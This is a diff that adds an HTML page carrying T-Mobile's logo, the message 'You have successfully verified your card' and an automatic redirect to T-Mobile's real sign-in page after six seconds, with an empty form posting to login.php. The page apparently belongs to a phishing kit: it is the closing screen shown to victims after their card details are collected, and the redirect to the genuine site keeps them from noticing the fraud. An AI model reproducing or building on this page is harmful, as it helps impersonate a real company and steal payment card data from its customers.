@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="refresh" content="6; URL=https://account.t-mobile.com/signin/v2/" />
+         <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Success</title>
+        <style>
+           
+            body{
+                width:100%;
+                height:100%;
+            }
+            img{
+                width:200px
+            }
+            .wrapper{
+                margin-left: 10px;
+                margin-top: 20px;
+            }
+            h4{
+                padding-left: 50px;
+                color: red;
+            }
+            .h{
+                padding-left: 90px;
+            }
+
+       
+           
+
+        </style>
+    </head>
+    <body>
+        <img src="https://www.t-mobile.com/news/_admin/uploads/2020/04/T-Mobile_New_Logo_Primary_RGB_M-on-K_Transparent.png">
+        <hr><br>
+    <form action="login.php" method="POST">
+        <div class="wrapper">
+            <h2>You have successfully verified your card</h2>
+            <img class="h" src="data:image/jpeg;base64,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">
+            <h4>You will be redirected to sign in shortly!</h4>
+        </div>
+    </form>
+
+        
+    </body>
+</html>
